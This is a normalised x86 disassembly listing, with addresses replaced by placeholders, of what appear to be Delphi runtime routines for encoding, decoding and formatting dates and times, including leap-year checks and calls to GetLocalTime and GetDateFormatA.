cmp ax 0x18
jae r-xdata
mov al [ ebp - 0x1 ]
pop esi
pop ecx
pop ecx
pop ebp
retn 0x8
cmp dx 0x3c
jae r-xdata
cmp cx 0x3c
jae r-xdata
cmp si 0x3e8
jae r-xdata
movzx eax ax
imul eax eax 0x36ee80
movzx edx dx
imul edx edx 0xea60
add eax edx
movzx edx cx
imul edx edx 0x3e8
add eax edx
movzx edx si
add eax edx
mov [ ebp - 0x8 ] eax
fild [ ebp - 0x8 ]
fdiv [ r-xdata ]
mov eax [ ebp + 0x8 ]
fstp [ eax ]
fwait
mov [ ebp - 0x1 ] 0x1
sub_4099bc
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
lea eax [ ebp - 0x4 ]
push eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
lea eax [ ebp - 0xc ]
call sub_409908
mov eax [ ebp - 0xc ]
lea ecx [ ebp - 0x2 ]
mov dx 0xea60
call sub_407b0c
push esi
mov ecx ebx
movzx eax [ ebp - 0x2 ]
mov dx 0x3c
call sub_407b0c
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
movzx eax [ ebp - 0x4 ]
mov dx 0x3e8
call sub_407b0c
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_409a18
push ebx
push esi
mov ecx eax
movzx eax cx
and eax 0x3
test eax eax
jne r-xdata
xor eax eax
pop esi
pop ebx
retn
movzx ebx cx
mov eax ebx
mov esi 0x64
xor edx edx
div esi
test edx edx
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax ebx
mov ecx 0x190
xor edx edx
div ecx
test edx edx
je r-xdata
sub_409a54
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov [ ebp - 0x2 ] ax
mov [ ebp - 0x3 ] 0x0
mov ax [ ebp - 0x2 ]
call sub_409a18
and eax 0x7f
lea eax [ eax + eax * 2 ]
lea esi [ eax * 8 + rw-data ]
cmp [ ebp - 0x2 ] 0x1
jb r-xdata
mov al [ ebp - 0x3 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
cmp [ ebp - 0x2 ] 0x270f
ja r-xdata
cmp di 0x1
jb r-xdata
cmp di 0xc
ja r-xdata
cmp bx 0x1
jb r-xdata
movzx eax di
cmp bx [ esi + eax * 2 - 0x2 ]
ja r-xdata
movzx eax di
dec eax
test eax eax
jle r-xdata
movzx ecx [ ebp - 0x2 ]
dec ecx
mov eax ecx
mov esi 0x64
cdq
idiv esi
imul esi ecx 0x16d
mov edx ecx
test edx edx
jns r-xdata
mov ecx 0x1
sar edx 0x2
add esi edx
sub esi eax
mov eax ecx
mov ecx 0x190
cdq
idiv ecx
add esi eax
movzx eax bx
add esi eax
sub esi 0xa955a
mov [ ebp - 0x8 ] esi
fild [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
fstp [ eax ]
fwait
mov [ ebp - 0x3 ] 0x1
add edx 0x3
add bx [ esi + ecx * 2 - 0x2 ]
inc ecx
dec eax
jne r-xdata
sub_409b1c
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
push esp
mov ecx edi
mov edx esi
mov eax ebx
call sub_409a54
test al al
jne r-xdata
fld [ esp ]
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ rw-data ]
call sub_407b28
sub_409b4c
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp + 0x8 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
lea eax [ ebp - 0x18 ]
call sub_409908
mov ecx [ ebp - 0x14 ]
test ecx ecx
jg r-xdata
mov eax ecx
mov esi 0x7
cdq
idiv esi
inc edx
mov [ ebx ] dx
dec ecx
mov bx 0x1
cmp ecx 0x23ab1
jl r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax ] 0x0
mov eax [ ebp - 0x8 ]
mov [ eax ] 0x0
mov eax [ ebp - 0xc ]
mov [ eax ] 0x0
mov [ ebx ] 0x0
xor edx edx
jmp r-xdata
lea eax [ ebp - 0xe ]
push eax
lea eax [ ebp - 0x10 ]
mov dx 0x8eac
xchg ecx eax
call sub_407b0c
cmp [ ebp - 0x10 ] 0x4
jne r-xdata
sub ecx 0x23ab1
add bx 0x190
cmp ecx 0x23ab1
jge r-xdata
mov eax edx
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
imul ax [ ebp - 0x10 ] 0x64
add bx ax
lea eax [ ebp - 0xe ]
push eax
lea ecx [ ebp - 0x10 ]
movzx eax [ ebp - 0xe ]
mov dx 0x5b5
call sub_407b0c
mov ax [ ebp - 0x10 ]
shl eax 0x2
add bx ax
lea eax [ ebp - 0xe ]
push eax
lea ecx [ ebp - 0x10 ]
movzx eax [ ebp - 0xe ]
mov dx 0x16d
call sub_407b0c
cmp [ ebp - 0x10 ] 0x4
jne r-xdata
dec [ ebp - 0x10 ]
add [ ebp - 0xe ] 0x8eac
add bx [ ebp - 0x10 ]
mov eax ebx
call sub_409a18
mov edx eax
xor eax eax
mov al dl
lea eax [ eax + eax * 2 ]
lea esi [ eax * 8 + rw-data ]
mov ax 0x1
dec [ ebp - 0x10 ]
add [ ebp - 0xe ] 0x16d
mov ecx [ ebp - 0x4 ]
mov [ ecx ] bx
mov ecx [ ebp - 0x8 ]
mov [ ecx ] ax
mov ax [ ebp - 0xe ]
inc eax
mov ecx [ ebp - 0xc ]
mov [ ecx ] ax
mov cx [ ebp - 0x10 ]
sub [ ebp - 0xe ] cx
inc eax
jmp r-xdata
movzx ecx ax
mov cx [ esi + ecx * 2 - 0x2 ]
mov [ ebp - 0x10 ] cx
mov cx [ ebp - 0xe ]
cmp cx [ ebp - 0x10 ]
jb r-xdata
sub_409c98
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x2 ]
push eax
mov eax esi
call sub_409b4c
pop esi
pop ecx
pop ebp
retn 0x8
sub_409cb8
push ebp
mov ebp esp
add esp 0xfffffff8
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x8 ]
call sub_409908
mov eax [ ebp - 0x4 ]
mov ecx 0x7
cdq
idiv ecx
mov eax edx
inc eax
pop ecx
pop ecx
pop ebp
retn 0x8
sub_409ce0
add esp 0xffffffe8
lea eax [ esp + 0x8 ]
push eax
call GetLocalTime
mov cx [ esp + 0xe ]
mov dx [ esp + 0xa ]
mov ax [ esp + 0x8 ]
call sub_409b1c
fstp [ esp ]
fwait
fld [ esp ]
add esp 0x18
retn
sub_409d20
push ebp
mov ebp esp
push ebx
mov ecx [ ebp + 0x8 ]
mov ebx 0x100
sub ebx [ ecx - 0x104 ]
cmp edx ebx
jge r-xdata
test ebx ebx
je r-xdata
mov ebx edx
mov eax [ ebp + 0x8 ]
add [ eax - 0x104 ] ebx
pop ebx
pop ebp
retn
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x104 ]
mov ecx [ ebp + 0x8 ]
lea edx [ ecx + edx - 0x100 ]
mov ecx ebx
call sub_4028d8
sub_409d64
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_4041a8
mov edx eax
mov eax ebx
call sub_409d20
pop ecx
pop ebx
pop ebp
retn
sub_409d84
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
push 0x4
mov [ ebp - 0x20 ] esi
mov [ ebp - 0x1c ] 0x0
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x14 ] 0x0
lea eax [ ebp - 0x20 ]
push eax
push 0x1
mov ecx rw-data
lea eax [ ebp - 0x10 ]
mov edx 0x10
call sub_4089a8
mov edx eax
lea eax [ ebp - 0x10 ]
call sub_409d20
pop ecx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_409dd0
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
add eax 0xfffffffc
mov edx [ eax ]
jmp r-xdata
mov ecx [ eax ]
mov cl [ ecx ]
mov ebx [ ebp + 0x8 ]
cmp cl [ ebx - 0x5 ]
je r-xdata
inc [ eax ]
mov eax [ eax ]
sub eax edx
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0xc ] eax
pop ebx
pop ebp
retn
sub_409dfc
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x13 ] 0x0
jne r-xdata
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x12 ]
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
add eax 0xfffffff2
call sub_409c98
mov eax [ ebp + 0x8 ]
mov [ eax - 0x13 ] 0x1
sub_409e34
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x1d ] 0x0
jne r-xdata
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
add eax 0xffffffe4
push eax
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x1a ]
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x18 ]
mov eax [ ebp + 0x8 ]
add eax 0xffffffea
call sub_4099bc
mov eax [ ebp + 0x8 ]
mov [ eax - 0x1d ] 0x1
sub_409e74
push ebp
mov ebp esp
add esp 0xfffffee8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x118 ] ecx
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_409fc2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_403ee8
mov eax [ ebp + 0x8 ]
mov ax [ eax - 0xe ]
mov [ ebp - 0x14 ] ax
mov eax [ ebp + 0x8 ]
mov ax [ eax - 0x10 ]
mov [ ebp - 0x12 ] ax
mov eax [ ebp + 0x8 ]
mov ax [ eax - 0x12 ]
mov [ ebp - 0xe ] ax
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_403f80
push 0x100
lea eax [ ebp - 0x114 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4043a8
push eax
lea eax [ ebp - 0x14 ]
push eax
push 0x4
call GetThreadLocale
push eax
call GetDateFormatA
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_409fc9
lea eax [ ebp - 0x118 ]
call sub_403ee8
lea eax [ ebp - 0x4 ]
call sub_403ee8
retn
mov eax ebx
lea edx [ ebp - 0x114 ]
mov ecx 0x100
call sub_404158
dec esi
jne r-xdata
mov eax [ rw-data ]
sub eax 0x4
je r-xdata
cmp [ rw-data ] 0x1
jne r-xdata
sub eax 0xd
jne r-xdata
mov eax [ ebx ]
call sub_4041a8
mov edx eax
mov eax [ ebx ]
call sub_40c3b8
cmp eax 0x4
jne r-xdata
push ebx
mov eax [ ebx ]
mov edx 0x1
call sub_40c52c
mov ecx eax
mov eax [ ebx ]
mov edx 0x1
call sub_404408
jmp r-xdata
mov eax [ ebx ]
mov edx 0x3
call sub_40c4c8
mov esi eax
lea eax [ ebp - 0x114 ]
add esi eax
dec esi
lea eax [ ebp - 0x118 ]
mov edx esi
call sub_4040e0
mov eax [ ebp - 0x118 ]
mov edx 0x2
call sub_40c52c
mov ecx eax
mov eax ebx
mov edx esi
call sub_403fd8
sub_409fdc
push ebp
mov ebp esp
add esp 0xfffffeec
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_40a0ba
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_403ee8
mov eax [ ebp + 0x8 ]
mov ax [ eax - 0xe ]
mov [ ebp - 0x14 ] ax
mov eax [ ebp + 0x8 ]
mov ax [ eax - 0x10 ]
mov [ ebp - 0x12 ] ax
mov eax [ ebp + 0x8 ]
mov ax [ eax - 0x12 ]
mov [ ebp - 0xe ] ax
cmp esi 0x2
jg r-xdata
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_403f80
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_403f80
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40a0c1
lea eax [ ebp - 0x4 ]
call sub_403ee8
retn
mov eax ebx
lea edx [ ebp - 0x114 ]
mov ecx 0x100
call sub_404158
dec esi
jne r-xdata
push 0x100
lea eax [ ebp - 0x114 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4043a8
push eax
lea eax [ ebp - 0x14 ]
push eax
push 0x4
call GetThreadLocale
push eax
call GetDateFormatA
test eax eax
je r-xdata
mov eax [ ebx ]
cmp [ eax ] 0x30
jne r-xdata
push ebx
mov eax [ ebx ]
call sub_4041a8
mov ecx eax
dec ecx
mov eax [ ebx ]
mov edx 0x2
call sub_404408
sub_40a0e4
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
xor edx edx
mov [ ebp - 0x28 ] edx
mov [ ebp - 0x24 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_40a865
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40a86c
lea eax [ ebp - 0x28 ]
mov edx 0x2
call sub_403f0c
retn
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x108 ] 0x2
jge r-xdata
mov eax [ ebp + 0x8 ]
inc [ eax - 0x108 ]
mov bl 0x20
mov [ ebp - 0x13 ] 0x0
mov [ ebp - 0x1d ] 0x0
mov [ ebp - 0x1e ] 0x0
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax ]
test al al
jne r-xdata
mov [ ebp - 0x5 ] al
mov al [ ebp - 0x5 ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x108 ]
mov eax [ ebp - 0x4 ]
call sub_40c5ac
mov [ ebp - 0x4 ] eax
mov al [ ebp - 0x5 ]
mov edx eax
add dl 0x9f
sub dl 0x1a
jae r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_40c58c
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_409d20
pop ecx
mov eax [ ebp - 0x4 ]
call sub_40c5ac
mov [ ebp - 0x4 ] eax
mov bl 0x20
jmp r-xdata
mov edx eax
add dl 0xbf
sub dl 0x1a
jae r-xdata
sub al 0x20
and eax 0xff
add eax 0xffffffde
cmp eax 0x38
ja r-xdata
cmp al 0x4d
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x5 ]
mov edx 0x1
call sub_409d20
pop ecx
mov al [ eax + lookup_table_40a1c7 ]
jmp [ eax * 4 + jump_table_40a200 ]
mov ebx eax
cmp bl 0x48
jne r-xdata
push ebp
call sub_409dd0
pop ecx
push ebp
call sub_409dfc
pop ecx
cmp [ ebp - 0xc ] 0x2
jg r-xdata
push ebp
call sub_409dd0
pop ecx
push ebp
call sub_409dfc
pop ecx
mov eax [ ebp + 0x8 ]
push eax
push ebp
lea edx [ ebp - 0x24 ]
mov eax [ ebp - 0xc ]
call sub_409e74
pop ecx
mov eax [ ebp - 0x24 ]
call sub_409d64
pop ecx
jmp r-xdata
push ebp
call sub_409dd0
pop ecx
push ebp
call sub_409dfc
pop ecx
mov eax [ ebp + 0x8 ]
push eax
push ebp
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0xc ]
call sub_409fdc
pop ecx
mov eax [ ebp - 0x28 ]
call sub_409d64
pop ecx
jmp r-xdata
push ebp
call sub_409dd0
pop ecx
push ebp
call sub_409dfc
pop ecx
mov eax [ ebp - 0xc ]
dec eax
sub eax 0x2
jb r-xdata
push ebp
call sub_409dd0
pop ecx
mov eax [ ebp - 0xc ]
dec eax
sub eax 0x2
jb r-xdata
push ebp
call sub_409dd0
pop ecx
push ebp
call sub_409e34
pop ecx
mov [ ebp - 0x1f ] 0x0
mov esi [ ebp - 0x4 ]
jmp r-xdata
push ebp
call sub_409dd0
pop ecx
push ebp
call sub_409e34
pop ecx
cmp [ ebp - 0xc ] 0x2
jle r-xdata
push ebp
call sub_409dd0
pop ecx
push ebp
call sub_409e34
pop ecx
cmp [ ebp - 0xc ] 0x2
jle r-xdata
push ebp
call sub_409dd0
pop ecx
cmp [ ebp - 0xc ] 0x1
jne r-xdata
push ebp
call sub_409dd0
pop ecx
push ebp
call sub_409e34
pop ecx
cmp [ ebp - 0xc ] 0x3
jle r-xdata
push ebp
call sub_409e34
pop ecx
mov esi [ ebp - 0x4 ]
dec esi
mov edx r-xdata
mov ecx 0x5
mov eax esi
call sub_408804
test eax eax
jne r-xdata
push ebp
call sub_409dd0
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_40a0e4
pop ecx
push ebp
call sub_409e34
pop ecx
cmp [ ebp - 0x16 ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov esi [ ebp - 0x4 ]
jmp r-xdata
mov al 0x4e
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0xe ]
mov edx 0x4
call sub_409d84
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0xe ]
mov ecx 0x64
xor edx edx
div ecx
mov eax edx
mov edx 0x2
call sub_409d84
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
call sub_409d84
pop ecx
jmp r-xdata
je r-xdata
push ebp
call sub_409dfc
pop ecx
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x12 ]
mov edx [ ebp - 0xc ]
call sub_409d84
pop ecx
jmp r-xdata
je r-xdata
mov al [ esi ]
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x18 ]
mov edx [ ebp - 0xc ]
call sub_409d84
pop ecx
jmp r-xdata
mov [ ebp - 0xc ] 0x2
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x1a ]
mov edx [ ebp - 0xc ]
call sub_409d84
pop ecx
jmp r-xdata
mov [ ebp - 0xc ] 0x2
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_40a0e4
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_40a0e4
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x1c ]
mov edx [ ebp - 0xc ]
call sub_409d84
pop ecx
jmp r-xdata
mov [ ebp - 0xc ] 0x3
mov edx r-xdata
mov ecx 0x3
mov eax esi
call sub_408804
test eax eax
jne r-xdata
cmp [ ebp - 0x16 ] 0xc
jb r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax r-xdata
mov edx 0x1
call sub_409d20
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_40a0e4
pop ecx
jmp r-xdata
cmp [ ebp - 0x18 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax rw-data
mov edx 0x1
call sub_409d20
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax rw-data
mov edx 0x1
call sub_409d20
pop ecx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax ]
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x10 ]
mov eax [ eax * 4 + rw-data ]
call sub_409d64
pop ecx
jmp r-xdata
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
call sub_409cb8
movzx eax ax
mov eax [ eax * 4 + rw-data ]
call sub_409d64
pop ecx
jmp r-xdata
dec eax
je r-xdata
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
mov ax [ ebp - 0x16 ]
cmp [ ebp - 0x1e ] 0x0
je r-xdata
mov edx r-xdata
mov ecx 0x4
mov eax esi
call sub_408804
test eax eax
jne r-xdata
cmp [ ebp - 0x16 ] 0xc
jb r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov edx 0x2
mov eax esi
call sub_409d20
pop ecx
add [ ebp - 0x4 ] 0x4
mov [ ebp - 0x1e ] 0x1
jmp r-xdata
add esi 0x3
cmp [ ebp - 0x1a ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov edx [ ebp - 0x4 ]
sub edx esi
mov eax esi
call sub_409d20
pop ecx
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x0
je r-xdata
cmp al [ ebp - 0x5 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x10 ]
mov eax [ eax * 4 + rw-data ]
call sub_409d64
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
call sub_409cb8
movzx eax ax
mov eax [ eax * 4 + rw-data ]
call sub_409d64
pop ecx
jmp r-xdata
dec eax
je r-xdata
xor eax eax
mov al [ esi ]
cmp eax 0x48
jg r-xdata
mov eax esi
call sub_40c5ac
mov esi eax
jmp r-xdata
cmp [ ebp - 0xc ] 0x2
jle r-xdata
test ax ax
jne r-xdata
mov edx r-xdata
mov ecx 0x4
mov eax esi
call sub_408804
test eax eax
jne r-xdata
cmp [ ebp - 0x16 ] 0xc
jae r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov edx 0x1
mov eax esi
call sub_409d20
pop ecx
add [ ebp - 0x4 ] 0x2
mov [ ebp - 0x1e ] 0x1
jmp r-xdata
add esi 0x2
inc [ ebp - 0x4 ]
jmp r-xdata
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_40a0e4
pop ecx
jmp r-xdata
jmp r-xdata
sub eax 0x61
je r-xdata
je r-xdata
mov edx [ ebp + 0x8 ]
push edx
movzx eax ax
mov edx [ ebp - 0xc ]
call sub_409d84
pop ecx
jmp r-xdata
mov [ ebp - 0xc ] 0x2
cmp ax 0xc
jbe r-xdata
mov ax 0xc
jmp r-xdata
mov edx r-xdata
mov ecx 0x3
mov eax esi
call sub_408804
test eax eax
jne r-xdata
push ebp
call sub_409dfc
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
call sub_409cb8
movzx eax ax
mov eax [ eax * 4 + rw-data ]
call sub_409d64
pop ecx
add [ ebp - 0x4 ] 0x3
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_409d64
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_409d64
pop ecx
jmp r-xdata
inc [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
call sub_40c5ac
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_40a0e4
pop ecx
jmp r-xdata
cmp [ ebp - 0x1f ] 0x0
jne r-xdata
sub eax 0x7
je r-xdata
sub eax 0x22
je r-xdata
sub ax 0xc
mov eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x5 ]
mov edx 0x1
call sub_409d20
pop ecx
jmp r-xdata
push ebp
call sub_409dfc
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
call sub_409cb8
movzx eax ax
mov eax [ eax * 4 + rw-data ]
call sub_409d64
pop ecx
add [ ebp - 0x4 ] 0x2
jmp r-xdata
add [ ebp - 0x4 ] 0x3
mov [ ebp - 0x1e ] 0x1
jmp r-xdata
inc esi
mov edx r-xdata
mov ecx 0x5
mov eax esi
call sub_408804
test eax eax
je r-xdata
jmp r-xdata
mov al [ ebp - 0x1f ]
xor al 0x1
mov [ ebp - 0x1f ] al
sub eax 0x5
je r-xdata
mov [ ebp - 0x1e ] 0x1
jmp r-xdata
mov edx r-xdata
mov ecx 0x3
mov eax esi
call sub_408804
test eax eax
je r-xdata
sub eax 0x1a
je r-xdata
mov edx r-xdata
mov ecx 0x4
mov eax esi
call sub_408804
test eax eax
jne r-xdata
jmp r-xdata
sub_40a898
push ebp
mov ebp esp
add esp 0xfffffef8
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
mov [ ebp - 0x104 ] eax
xor eax eax
mov [ ebp - 0x108 ] eax
test ebx ebx
je r-xdata
push ebp
mov eax r-xdata
call sub_40a0e4
pop ecx
push ebp
mov eax ebx
call sub_40a0e4
pop ecx
jmp r-xdata
lea edx [ ebp - 0x100 ]
mov eax esi
mov ecx [ ebp - 0x104 ]
call sub_403fd8
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_40a908
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov ebx [ edi ]
jmp r-xdata
mov eax esi
call sub_4041a8
cmp ebx eax
jg r-xdata
mov [ edi ] ebx
pop edi
pop esi
pop ebx
retn
cmp [ esi + ebx - 0x1 ] 0x20
je r-xdata
inc ebx
sub_40a92c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
mov [ ebp - 0x9 ] 0x0
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x0
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_40a908
mov ebx [ ebp - 0x4 ]
mov ebx [ ebx ]
xor esi esi
jmp r-xdata
mov eax edi
call sub_4041a8
cmp ebx eax
jg r-xdata
mov eax [ ebp - 0x4 ]
cmp ebx [ eax ]
jle r-xdata
mov al [ edi + ebx - 0x1 ]
add al 0xd0
sub al 0xa
jae r-xdata
mov al [ ebp - 0x9 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax ebx
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
sub al dl
mov edx [ ebp + 0x8 ]
mov [ edx ] al
mov eax [ ebp - 0x4 ]
mov [ eax ] ebx
mov eax [ ebp - 0x8 ]
mov [ eax ] si
mov [ ebp - 0x9 ] 0x1
cmp si 0x3e8
jb r-xdata
mov eax esi
add eax eax
lea eax [ eax + eax * 4 ]
xor edx edx
mov dl [ edi + ebx - 0x1 ]
sub dx 0x30
add ax dx
mov esi eax
inc ebx
sub_40a9c0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_40aa39
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
test edi edi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40aa40
lea eax [ ebp - 0x8 ]
call sub_403ee8
retn
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_40a908
lea eax [ ebp - 0x8 ]
push eax
mov eax edi
call sub_4041a8
mov ecx eax
mov edx [ esi ]
mov eax [ ebp - 0x4 ]
call sub_404408
mov edx [ ebp - 0x8 ]
mov eax edi
call sub_407dc8
test eax eax
jne r-xdata
mov eax edi
call sub_4041a8
add [ esi ] eax
mov bl 0x1
sub_40aa4c
push ebx
push esi
push edi
push ecx
mov [ esp ] cl
mov edi edx
mov esi eax
xor ebx ebx
mov edx edi
mov eax esi
call sub_40a908
mov eax esi
call sub_4041a8
cmp eax [ edi ]
jl r-xdata
mov eax ebx
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ edi ]
mov al [ esi + eax - 0x1 ]
cmp al [ esp ]
jne r-xdata
inc [ edi ]
mov bl 0x1
sub_40aa84
push ebx
push esi
push edi
mov esi eax
xor ebx ebx
mov edi 0x1
jmp r-xdata
mov eax esi
call sub_4041a8
cmp edi eax
jle r-xdata
mov al [ esi + edi - 0x1 ]
and al 0xdf
sub al 0x44
je r-xdata
xor ebx ebx
mov bl 0x1
jmp r-xdata
dec al
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov bl 0x2
jmp r-xdata
sub al 0x8
je r-xdata
xor ebx ebx
jmp r-xdata
sub al 0xc
je r-xdata
mov bl 0x2
jmp r-xdata
jmp r-xdata
inc edi
sub_40aad0
push ebx
push esi
mov ebx edx
mov esi eax
jmp r-xdata
mov eax esi
call sub_4041a8
cmp eax [ ebx ]
jl r-xdata
pop esi
pop ebx
retn
mov eax [ ebx ]
mov al [ esi + eax - 0x1 ]
add al 0xd0
sub al 0xa
jae r-xdata
mov eax [ ebx ]
mov al [ esi + eax - 0x1 ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
inc [ ebx ]
mov edx [ ebx ]
mov eax esi
call sub_40c5f0
mov [ ebx ] eax
jmp r-xdata
sub_40ab18
push ebx
push esi
push edi
push ebp
push ecx
mov ebp eax
xor eax eax
mov [ esp ] eax
